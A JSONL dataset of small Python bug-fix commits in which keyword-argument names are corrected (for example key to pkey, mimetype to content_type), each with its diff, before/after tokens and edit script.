{"project": "st2", "commit_sha": "545a5686ed2754704d706cc54f49e64bb0de7b45", "parent_sha": "dca521db6afc86c6bfdbb4e7d4fb7989da9c245f", "file_path": "st2actions/st2actions/runners/paramiko_ssh_runner.py", "project_url": "https://github.com/ojosdegris/st2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class BaseParallelSSHRunner(ActionRunner, ShellRunnerMixin):\n         concurrency = int(len(self._hosts) / 3) + 1 if self._parallel else 1\n         self._parallel_ssh_client = ParallelSSHClient(\n             hosts=self._hosts,\n-            user=self._username, key=self._ssh_key_file, password=self._password,\n+            user=self._username, pkey=self._ssh_key_file, password=self._password,\n             port=22, concurrency=concurrency, raise_on_error=False,\n             connect=True\n         )\n", "before": "self . _parallel_ssh_client = ParallelSSHClient ( hosts = self . _hosts , user = self . _username , key = self . _ssh_key_file , password = self . _password , port = 22 , concurrency = concurrency , raise_on_error = False , connect = True )", "after": "self . _parallel_ssh_client = ParallelSSHClient ( hosts = self . _hosts , user = self . _username , pkey = self . _ssh_key_file , password = self . _password , port = 22 , concurrency = concurrency , raise_on_error = False , connect = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:key\", 3, 34, 3, 37], \"pkey\"]]"}
{"project": "salt", "commit_sha": "c74763d179e805931122b127e95a364271765885", "parent_sha": "6be32594cbceff46c6b3800f176c7d40cdfa0943", "file_path": "salt/transport/mixins/auth.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -435,7 +435,7 @@ class AESReqServerMixin(object):\n         try:\n             pub = salt.crypt.get_rsa_pub_key(pubfn)\n         except Exception as err:\n-            log.error('Corrupt public key \"%s\": %s', pubfn, err, exc_at_loglevel=logging.DEBUG)\n+            log.error('Corrupt public key \"%s\": %s', pubfn, err, exc_info_on_loglevel=logging.DEBUG)\n             return {'enc': 'clear',\n                     'load': {'ret': False}}\n \n", "before": "log . error ( 'Corrupt public key \"%s\": %s' , pubfn , err , exc_at_loglevel = logging . DEBUG )", "after": "log . error ( 'Corrupt public key \"%s\": %s' , pubfn , err , exc_info_on_loglevel = logging . DEBUG )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:exc_at_loglevel\", 3, 66, 3, 81], \"exc_info_on_loglevel\"]]"}
{"project": "salt", "commit_sha": "354e664746fd3c9f441cf0ec4a6cf4fb2a44e1d2", "parent_sha": "a429ef84eaefe117a5ac3afdb2a55fef71c5c310", "file_path": "salt/modules/nilrt_ip.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ def _get_static_info(interface):\n     }\n     hwaddr_section_number = ''.join(data['hwaddr'].split(':'))\n     if os.path.exists(INTERFACES_CONFIG):\n-        information = _load_config(hwaddr_section_number, ['IPv4', 'Nameservers'], file=INTERFACES_CONFIG)\n+        information = _load_config(hwaddr_section_number, ['IPv4', 'Nameservers'], filename=INTERFACES_CONFIG)\n         if information['IPv4'] != '':\n             ipv4_information = information['IPv4'].split('/')\n             data['ipv4']['address'] = ipv4_information[0]\n", "before": "information = _load_config ( hwaddr_section_number , [ 'IPv4' , 'Nameservers' ] , file = INTERFACES_CONFIG )", "after": "information = _load_config ( hwaddr_section_number , [ 'IPv4' , 'Nameservers' ] , filename = INTERFACES_CONFIG )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:file\", 3, 84, 3, 88], \"filename\"]]"}
{"project": "nova", "commit_sha": "aeecfe09c463d0b14f8f525234d25eb0ef4c5523", "parent_sha": "9c2308424efbefb3b3e10b0343d468902f4b99d8", "file_path": "nova/api/openstack/placement/deploy.py", "project_url": "https://github.com/karimull/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ def deploy(conf, project_name):\n     else:\n         # Do not provide global conf to middleware here.\n         auth_middleware = auth_token.filter_factory(\n-            {}, olso_config_project=project_name)\n+            {}, oslo_config_project=project_name)\n \n     context_middleware = auth.PlacementKeystoneContext\n     req_id_middleware = request_id.RequestId\n", "before": "else : auth_middleware = auth_token . filter_factory ( { } , olso_config_project = project_name )", "after": "else : auth_middleware = auth_token . filter_factory ( { } , oslo_config_project = project_name )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:olso_config_project\", 3, 17, 3, 36], \"oslo_config_project\"]]"}
{"project": "pyramid", "commit_sha": "d25cecd9ac9504bd41b6ca430943287971ec7c24", "parent_sha": "2dbe3c9132ff850a18384b1e02087824a841e846", "file_path": "docs/tutorials/bfgwiki2/src/views/tutorial/views.py", "project_url": "https://github.com/kaymccormick/pyramid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ wikiwords = re.compile(r\"\\b([A-Z]\\w+[A-Z]+\\w+)\")\n static_view = static('templates/static')\n \n def view_wiki(context, request):\n-    return HTTPFound(location = url_for('view_page', page_name='FrontPage'))\n+    return HTTPFound(location = url_for('view_page', pagename='FrontPage'))\n \n def view_page(context, request):\n     session = DBSession()\n", "before": "return HTTPFound ( location = url_for ( 'view_page' , page_name = 'FrontPage' ) )", "after": "return HTTPFound ( location = url_for ( 'view_page' , pagename = 'FrontPage' ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:page_name\", 3, 54, 3, 63], \"pagename\"]]"}
{"project": "coala-bears", "commit_sha": "55c8ce7bafcd3f1e8ce514f4b7626ce825e1b7f6", "parent_sha": "a6b58d8633cd3934f1cd62d5de6841e7c2a1ab14", "file_path": "tests/vcs/git/GitCommitBearTest.py", "project_url": "https://github.com/muarachmann/coala-bears", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -331,7 +331,7 @@ class GitCommitBearTest(unittest.TestCase):\n         self.assertEqual(self.run_uut(\n                              body_close_issue=True,\n                              body_close_issue_full_url=True,\n-                             body_close_issue_last_line=True), [])\n+                             body_close_issue_on_last_line=True), [])\n         self.assert_no_msgs()\n \n         # Has keyword but no valid issue URL\n", "before": "self . assertEqual ( self . run_uut ( body_close_issue = True , body_close_issue_full_url = True , body_close_issue_last_line = True ) , [ ] )", "after": "self . assertEqual ( self . run_uut ( body_close_issue = True , body_close_issue_full_url = True , body_close_issue_on_last_line = True ) , [ ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:body_close_issue_last_line\", 3, 30, 3, 56], \"body_close_issue_on_last_line\"]]"}
{"project": "pyqmix", "commit_sha": "f5501a3e8d4089a50c92185190f842b815782126", "parent_sha": "f5717cb8a8adb91069b809b43b0e8631b4240533", "file_path": "pyqmix/pump.py", "project_url": "https://github.com/psyfood/pyqmix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -477,7 +477,7 @@ class QmixPump(object):\n         syringes = {'25 mL glass': dict(inner_diameter_mm=23.03294,\n                                         max_piston_stroke_mm=60),\n                     '50 mL glass': dict(inner_diameter_mm=32.57350,\n-                                        max_piston_stroke=60)}\n+                                        max_piston_stroke_mm=60)}\n \n         if syringe_type not in syringes.keys():\n             raise ValueError('Unknown syringe type.')\n", "before": "syringes = { '25 mL glass' : dict ( inner_diameter_mm = 23.03294 , max_piston_stroke_mm = 60 ) , '50 mL glass' : dict ( inner_diameter_mm = 32.57350 , max_piston_stroke = 60 ) }", "after": "syringes = { '25 mL glass' : dict ( inner_diameter_mm = 23.03294 , max_piston_stroke_mm = 60 ) , '50 mL glass' : dict ( inner_diameter_mm = 32.57350 , max_piston_stroke_mm = 60 ) }", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:max_piston_stroke\", 3, 41, 3, 58], \"max_piston_stroke_mm\"]]"}
{"project": "zeus", "commit_sha": "56028d0366c4897ede64f0820cebe71ebf3564aa", "parent_sha": "ef0ce78087f998aa3c969ac4cac0a2c6cfedd64a", "file_path": "helios/stats_views.py", "project_url": "https://github.com/itminedu/zeus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ def require_admin(request):\n \n def home(request):\n   user = require_admin(request)\n-  num_votes_in_queue = CastVote.objects.filter(invalidated_at=None, cast_at=None).count()\n+  num_votes_in_queue = CastVote.objects.filter(invalidated_at=None, verified_at=None).count()\n   return render_template(request, 'stats', {'num_votes_in_queue': num_votes_in_queue})\n \n def elections(request):\n", "before": "num_votes_in_queue = CastVote . objects . filter ( invalidated_at = None , cast_at = None ) . count ( )", "after": "num_votes_in_queue = CastVote . objects . filter ( invalidated_at = None , verified_at = None ) . count ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:cast_at\", 3, 69, 3, 76], \"verified_at\"]]"}
{"project": "mwlib", "commit_sha": "0317a2cfeeb7d395a7372c016c2ef89e304186f3", "parent_sha": "92e381240872ea697b1bfed44f817500ede7a2a8", "file_path": "mwlib/wiki.py", "project_url": "https://github.com/stepping-stone/mwlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ url=\n         licenses = []\n         for license in self.metabook.licenses:\n             if license.get('mw_license_url'):\n-                wikitext = utils.fetch_url(license['mw_license_url'], ingore_errors=True)\n+                wikitext = utils.fetch_url(license['mw_license_url'], ignore_errors=True)\n             elif license.get('mw_rights_text'):\n                 wikitext = ''\n                 if license.get('mw_rights_icon'):\n", "before": "wikitext = utils . fetch_url ( license [ 'mw_license_url' ] , ingore_errors = True )", "after": "wikitext = utils . fetch_url ( license [ 'mw_license_url' ] , ignore_errors = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:ingore_errors\", 3, 71, 3, 84], \"ignore_errors\"]]"}
{"project": "mwlib", "commit_sha": "8e56e1ebb8a20e16345357f3136ebee0f1c07215", "parent_sha": "bed75185d6da61b44edd8182052d679f99c797e7", "file_path": "mwlib/wiki.py", "project_url": "https://github.com/stepping-stone/mwlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ url=\n                 wikitext = utils.fetch_url(\n                     license['mw_license_url'],\n                     ignore_errors=True,\n-                    excpected_content_type='text/x-wiki',\n+                    expected_content_type='text/x-wiki',\n                 )\n                 if wikitext:\n                     try:\n", "before": "wikitext = utils . fetch_url ( license [ 'mw_license_url' ] , ignore_errors = True , excpected_content_type = 'text/x-wiki' , )", "after": "wikitext = utils . fetch_url ( license [ 'mw_license_url' ] , ignore_errors = True , expected_content_type = 'text/x-wiki' , )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:excpected_content_type\", 3, 21, 3, 43], \"expected_content_type\"]]"}
{"project": "CouchPotatoServer", "commit_sha": "f8b2547a45877fdec1dde00854a6cb3735998739", "parent_sha": "304de5adb615448a144222eaafb53dce8f96719a", "file_path": "couchpotato/core/plugins/automation.py", "project_url": "https://github.com/alonalbert/CouchPotatoServer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class Automation(Plugin):\n             prop_name = 'automation.added.%s' % imdb_id\n             added = Env.prop(prop_name, default = False)\n             if not added:\n-                added_movie = fireEvent('movie.add', params = {'identifier': imdb_id}, force_readd = False, search_after = False, update_library = True, single = True)\n+                added_movie = fireEvent('movie.add', params = {'identifier': imdb_id}, force_readd = False, search_after = False, update_after = True, single = True)\n                 if added_movie:\n                     movie_ids.append(added_movie['id'])\n                 Env.prop(prop_name, True)\n", "before": "added_movie = fireEvent ( 'movie.add' , params = { 'identifier' : imdb_id } , force_readd = False , search_after = False , update_library = True , single = True )", "after": "added_movie = fireEvent ( 'movie.add' , params = { 'identifier' : imdb_id } , force_readd = False , search_after = False , update_after = True , single = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:update_library\", 3, 131, 3, 145], \"update_after\"]]"}
{"project": "tpot", "commit_sha": "e8b613554232025133c317e1186c83e4b29bb202", "parent_sha": "dfde6d1d65d8f834958ec89378a71f84dc01127c", "file_path": "tpot/base.py", "project_url": "https://github.com/prokopyev/tpot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -739,7 +739,7 @@ class TPOTBase(BaseEstimator):\n             return resulting_score\n \n         if not sys.platform.startswith('win'):\n-            pool = ProcessPool(processes=self.n_jobs)\n+            pool = ProcessPool(nodes=self.n_jobs)\n             res_imap = pool.imap(_wrapped_cross_val_score, sklearn_pipeline_list)\n             if not self._pbar.disable:\n                 ini_pbar_n = self._pbar.n\n", "before": "pool = ProcessPool ( processes = self . n_jobs )", "after": "pool = ProcessPool ( nodes = self . n_jobs )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:processes\", 3, 32, 3, 41], \"nodes\"]]"}
{"project": "django-nyt", "commit_sha": "d775f6e4d2bc4e9b84f2725257bc6b202f9597fa", "parent_sha": "b40ddf99ccd1d0d88939ecfe3a263849cf7319ce", "file_path": "django_nyt/decorators.py", "project_url": "https://github.com/benjaoming/django-nyt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ def json_view(func):\n         obj = func(request, *args, **kwargs)\n         data = json.dumps(obj, ensure_ascii=False)\n         status = kwargs.get('status', 200)\n-        response = HttpResponse(mimetype='application/json', status=status)\n+        response = HttpResponse(content_type='application/json', status=status)\n         response.write(data)\n         return response\n     return wrap\n", "before": "response = HttpResponse ( mimetype = 'application/json' , status = status )", "after": "response = HttpResponse ( content_type = 'application/json' , status = status )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:mimetype\", 3, 33, 3, 41], \"content_type\"]]"}
{"project": "fieldsight-kobocat", "commit_sha": "3232916af8fc79992ede5b8dd7ec2ee7c08ee3bf", "parent_sha": "a1d71ba835b2493d5e035fd6a955a854ad0303c9", "file_path": "onadata/apps/users/serializers.py", "project_url": "https://github.com/awemulya/fieldsight-kobocat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ class AuthCustomTokenSerializer(serializers.Serializer):\n             if validateEmail(email_or_username):\n                 user_request = get_object_or_404(\n                     User,\n-                    email=email_or_username,\n+                    email__iexact=email_or_username,\n                 )\n \n                 email_or_username = user_request.username\n", "before": "user_request = get_object_or_404 ( User , email = email_or_username , )", "after": "user_request = get_object_or_404 ( User , email__iexact = email_or_username , )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:email\", 3, 21, 3, 26], \"email__iexact\"]]"}
{"project": "argus-ci", "commit_sha": "d9133c17eb95bbf33b2497e6c1efc3c6188b6713", "parent_sha": "c989d47381fa2c92330c15552bc37f6484ef9f0e", "file_path": "argus/recipes/base.py", "project_url": "https://github.com/PCManticore/argus-ci", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class BaseRecipe(object):\n         # Also, if the retrying limit is reached, `ArgusTimeoutError`\n         # will be raised.\n         return self._remote_client.run_command_with_retry(\n-            cmd, retry_count=count, delay=delay)[0]\n+            cmd, count=count, delay=delay)[0]\n \n     def _execute_until_condition(self, cmd, cond, count=RETRY_COUNT,\n                                  delay=RETRY_DELAY):\n", "before": "return self . _remote_client . run_command_with_retry ( cmd , retry_count = count , delay = delay ) [ 0 ]", "after": "return self . _remote_client . run_command_with_retry ( cmd , count = count , delay = delay ) [ 0 ]", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:retry_count\", 3, 18, 3, 29], \"count\"]]"}
{"project": "jper", "commit_sha": "c1fb7241fba95a2e99cec591aadfab750c2f8886", "parent_sha": "bc3f76f84a10c5401aa13cbfeee873049e96347c", "file_path": "service/routing.py", "project_url": "https://github.com/JiscPER/jper", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -405,7 +405,7 @@ def repackage(unrouted, repo_ids):\n     links = []\n     for d in done:\n         with app.test_request_context():\n-            url = app.config.get(\"BASE_URL\") + url_for(\"webapi.retrieve_content\", notification_id=unrouted.id, content_id=d[2])\n+            url = app.config.get(\"BASE_URL\") + url_for(\"webapi.retrieve_content\", notification_id=unrouted.id, filename=d[2])\n         links.append({\n             \"type\": \"package\",\n             \"format\" : \"application/zip\",\n", "before": "url = app . config . get ( \"BASE_URL\" ) + url_for ( \"webapi.retrieve_content\" , notification_id = unrouted . id , content_id = d [ 2 ] )", "after": "url = app . config . get ( \"BASE_URL\" ) + url_for ( \"webapi.retrieve_content\" , notification_id = unrouted . id , filename = d [ 2 ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:content_id\", 3, 112, 3, 122], \"filename\"]]"}
{"project": "getwebfilesinator", "commit_sha": "617e27d36ba4629b864e54e8bb7e9ebc473e0fd1", "parent_sha": "511bf70418ed83fe82a6a6bf1d0215a020ad102f", "file_path": "getwebfilesinator/getwebfilesinator/utils.py", "project_url": "https://github.com/ellethee/getwebfilesinator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -230,7 +230,7 @@ def process_zip(sfile, cfg):\n         # cycle through the files in sfile\n         for rfile in sfile.files:\n             # copy parent's properties\n-            rfile.weakupdate(sfile, _skipkeys=['files'])\n+            rfile.weakupdate(sfile, skipkeys=['files'])\n             # cycle through the extracted file for the rfile (could be a glob\n             # syntax in the filename).\n             for filename in [join(sfile.tmpdir, f) for f in rfile.zfiles]:\n", "before": "rfile . weakupdate ( sfile , _skipkeys = [ 'files' ] )", "after": "rfile . weakupdate ( sfile , skipkeys = [ 'files' ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:_skipkeys\", 3, 37, 3, 46], \"skipkeys\"]]"}
{"project": "ddr-local", "commit_sha": "04a979190c226e2ac667b0f3b30c45c5b38489d8", "parent_sha": "08298ff8a9450170361b71ad8428bf665bfb66ab", "file_path": "ddrlocal/webui/views/__init__.py", "project_url": "https://github.com/densho/ddr-local", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,4 +139,4 @@ def task_status( request ):\n def task_dismiss( request, task_id ):\n     dismiss_session_task(request, task_id)\n     data = {'status':'ok'}\n-    return HttpResponse(json.dumps(data), mimetype=\"application/json\")\n+    return HttpResponse(json.dumps(data), content_type=\"application/json\")\n", "before": "return HttpResponse ( json . dumps ( data ) , mimetype = \"application/json\" )", "after": "return HttpResponse ( json . dumps ( data ) , content_type = \"application/json\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:mimetype\", 3, 43, 3, 51], \"content_type\"]]"}
{"project": "Theano", "commit_sha": "81d7f9c82c2b645783ae4b7ec050c3414891a2d3", "parent_sha": "c4f1ede234b98be838f3c47f9654b6938dbc0da3", "file_path": "theano/sandbox/cuda/dnn.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ if ((err = cudnnCreate(&_handle)) != CUDNN_STATUS_SUCCESS) {\n             # GPU are installed or if the GPUs are configured in\n             # exclusive mode, this cause bad detection.\n             comp, out, err = NVCC_compiler.try_flags(\n-                params=params, preambule=preambule, body=body,\n+                flag_list=params, preambule=preambule, body=body,\n                 try_run=False, output=True)\n \n             dnn_available.avail = comp\n", "before": "comp , out , err = NVCC_compiler . try_flags ( params = params , preambule = preambule , body = body , try_run = False , output = True )", "after": "comp , out , err = NVCC_compiler . try_flags ( flag_list = params , preambule = preambule , body = body , try_run = False , output = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:params\", 3, 17, 3, 23], \"flag_list\"]]"}
{"project": "osmcha-django", "commit_sha": "b70356d938979837ccac2db4afa85a8a53821698", "parent_sha": "2d1ae01698bbd1801f9ecdb5eade80ac93094d5e", "file_path": "osmchadjango/changeset/views.py", "project_url": "https://github.com/willemarcel/osmcha-django", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class ChangesetListView(ListView):\n             params['is_whitelisted'] = 'True'\n         queryset = ChangesetFilter(params, queryset=queryset).qs\n         if 'user_blocks' in params:\n-            queryset = queryset.filter(user_detail__blocks__gt=0)\n+            queryset = queryset.filter(user_detail__contributor_blocks__gt=0)\n         if 'reasons' in params:\n             queryset = queryset.filter(reasons=int(params['reasons']))\n \n", "before": "queryset = queryset . filter ( user_detail__blocks__gt = 0 )", "after": "queryset = queryset . filter ( user_detail__contributor_blocks__gt = 0 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:user_detail__blocks__gt\", 3, 40, 3, 63], \"user_detail__contributor_blocks__gt\"]]"}
{"project": "osmcha-django", "commit_sha": "b9e516b3c7cd663a4d3094030d14a905bda6fc70", "parent_sha": "5f758d45e963a783826ec84424e1849e099ddc3d", "file_path": "osmchadjango/changeset/views.py", "project_url": "https://github.com/willemarcel/osmcha-django", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -234,7 +234,7 @@ def stats(request):\n     else:\n         changesets_qset = Changeset.objects.all()\n     if reviewer != '':\n-        changesets_qset = changesets_qset.filter(check_user__name=reviewer)\n+        changesets_qset = changesets_qset.filter(check_user__username=reviewer)\n     total_checked = changesets_qset.filter(checked=True).count()\n     total_harmful = changesets_qset.filter(harmful=True).count()\n     users_whitelisted = UserWhitelist.objects.values('whitelist_user').distinct().count()\n", "before": "changesets_qset = changesets_qset . filter ( check_user__name = reviewer )", "after": "changesets_qset = changesets_qset . filter ( check_user__username = reviewer )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:check_user__name\", 3, 50, 3, 66], \"check_user__username\"]]"}
{"project": "django-mptt", "commit_sha": "54cfd5364038fad128c553d4106a184f1f4c67e3", "parent_sha": "8ab6a85aecd8023afb709ab5e1e3ad26e58a84a4", "file_path": "mptt/models.py", "project_url": "https://github.com/Flimm/django-mptt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -462,7 +462,7 @@ class MPTTModel(models.Model):\n             )\n         else:\n             qs = self._tree_manager._mptt_filter(qs,\n-                parent__id=getattr(self, '%s_id' % self._mptt_meta.parent_attr),\n+                parent__pk=getattr(self, '%s_id' % self._mptt_meta.parent_attr),\n                 left__gt=self._mpttfield('right'),\n             )\n \n", "before": "qs = self . _tree_manager . _mptt_filter ( qs , parent__id = getattr ( self , '%s_id' % self . _mptt_meta . parent_attr ) , left__gt = self . _mpttfield ( 'right' ) , )", "after": "qs = self . _tree_manager . _mptt_filter ( qs , parent__pk = getattr ( self , '%s_id' % self . _mptt_meta . parent_attr ) , left__gt = self . _mpttfield ( 'right' ) , )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:parent__id\", 3, 17, 3, 27], \"parent__pk\"]]"}
{"project": "formulas", "commit_sha": "46c8838b64247889dbc26ea4efd00f255437e00a", "parent_sha": "61631579c6bd268c815a18898d27ff54c775c6e8", "file_path": "test/test_excel.py", "project_url": "https://github.com/vinci1it2000/formulas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class TestExcelModel(unittest.TestCase):\n         self.assertEqual([x.value[0, 0] for x in func(*i)], res)\n \n     def test_excel_model_cycles(self):\n-        xl_model = ExcelModel().loads(self.filename_circular).finish(cycles=1)\n+        xl_model = ExcelModel().loads(self.filename_circular).finish(circular=1)\n         xl_model.calculate()\n         books = xl_model.books\n         books = {k: _book2dict(v[BOOK])\n", "before": "xl_model = ExcelModel ( ) . loads ( self . filename_circular ) . finish ( cycles = 1 )", "after": "xl_model = ExcelModel ( ) . loads ( self . filename_circular ) . finish ( circular = 1 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:cycles\", 3, 70, 3, 76], \"circular\"]]"}
{"project": "rl-agents", "commit_sha": "0883e13ab97c3b2eb2c0ce1a379002fbd363517a", "parent_sha": "5c5a372c2117edde7e2013636f11962aa1e89aa3", "file_path": "rl_agents/agents/tree_search/mcts.py", "project_url": "https://github.com/eleurent/rl-agents", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -289,7 +289,7 @@ class MCTS(Configurable):\n         \"\"\"\n             Reset the MCTS tree to a root node for the new state.\n         \"\"\"\n-        self.root = type(self.root)(None, mcts=self)\n+        self.root = type(self.root)(None, planner=self)\n \n     def step_by_subtree(self, action):\n", "before": "self . root = type ( self . root ) ( None , mcts = self )", "after": "self . root = type ( self . root ) ( None , planner = self )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:mcts\", 3, 43, 3, 47], \"planner\"]]"}
{"project": "salt", "commit_sha": "fd43abb291dadd16c08ade9c77c7cd5b0239f26d", "parent_sha": "6c56a152757526fe354e61ce81bd2dda83a4e166", "file_path": "salt/modules/win_pkg.py", "project_url": "https://github.com/singlehopllc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -370,7 +370,7 @@ def refresh_db(saltenv='base'):\n     __context__.pop('winrepo.data', None)\n     repo = __opts__['win_repo_source_dir']\n-    cached_files = __salt__['cp.cache_dir'](repo, saltenv, include_path='*.sls')\n+    cached_files = __salt__['cp.cache_dir'](repo, saltenv, include_pat='*.sls')\n     return cached_files\n \n \n", "before": "cached_files = __salt__ [ 'cp.cache_dir' ] ( repo , saltenv , include_path = '*.sls' )", "after": "cached_files = __salt__ [ 'cp.cache_dir' ] ( repo , saltenv , include_pat = '*.sls' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:include_path\", 2, 60, 2, 72], \"include_pat\"]]"}
{"project": "erpnext", "commit_sha": "b23d15fba99bc1d5c2ba962757d3b3fdf220b2d6", "parent_sha": "5e096df5ae88994fe99ee231943f188b45fc9828", "file_path": "erpnext/regional/india/setup.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -271,7 +271,7 @@ def set_salary_components(docs):\n \n def set_tax_withholding_category(docs, company):\n \taccounts = []\n-\ttds_account = frappe.db.get_value(\"Account\", filter={\"account_type\": \"Payable\",\n+\ttds_account = frappe.db.get_value(\"Account\", filters={\"account_type\": \"Payable\",\n \t\t\"account_name\": \"TDS\", \"company\": company})\n \n \tif company and tds_account:\n", "before": "tds_account = frappe . db . get_value ( \"Account\" , filter = { \"account_type\" : \"Payable\" , \"account_name\" : \"TDS\" , \"company\" : company } )", "after": "tds_account = frappe . db . get_value ( \"Account\" , filters = { \"account_type\" : \"Payable\" , \"account_name\" : \"TDS\" , \"company\" : company } )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:filter\", 3, 47, 3, 53], \"filters\"]]"}
{"project": "erpnext", "commit_sha": "adc15295678a28d0ae9275b4cf9020003774cbf8", "parent_sha": "3f2c5c231972d350c2f4a7eee6440eed4557cc19", "file_path": "erpnext/hr/doctype/leave_application/leave_application.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -125,7 +125,7 @@ class LeaveApplication(Document):\n \t\t\t\tstatus = \"Half Day\" if date == self.half_day_date else \"On Leave\"\n \n \t\t\t\tattendance_name = frappe.db.exists('Attendance', dict(employee = self.employee,\n-\t\t\t\t\tattenance_date = date, docstatus = ('!=', 2)))\n+\t\t\t\t\tattendance_date = date, docstatus = ('!=', 2)))\n \n \t\t\t\tif attendance_name:\n \t\t\t\t\t# update existing attendance, change absent to on leave\n", "before": "attendance_name = frappe . db . exists ( 'Attendance' , dict ( employee = self . employee , attenance_date = date , docstatus = ( '!=' , 2 ) ) )", "after": "attendance_name = frappe . db . exists ( 'Attendance' , dict ( employee = self . employee , attendance_date = date , docstatus = ( '!=' , 2 ) ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:attenance_date\", 3, 6, 3, 20], \"attendance_date\"]]"}
{"project": "Flickipedia", "commit_sha": "5916bedad2f1e6060dd4f08cfe65ec508dcc6b6e", "parent_sha": "8eefbf801f094f06dc6406724f049b53f8c5d563", "file_path": "flickipedia/model/photos.py", "project_url": "https://github.com/rfaulkner/Flickipedia", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,4 +28,4 @@ class PhotoModel(object):\n \n     def insert_photo(self, flickr_id, article_id):\n         return self.io.insert('Photo', flickr_id=flickr_id,\n-                              article=article_id, votes=0)\n+                              article_id=article_id, votes=0)\n", "before": "return self . io . insert ( 'Photo' , flickr_id = flickr_id , article = article_id , votes = 0 )", "after": "return self . io . insert ( 'Photo' , flickr_id = flickr_id , article_id = article_id , votes = 0 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:article\", 3, 31, 3, 38], \"article_id\"]]"}
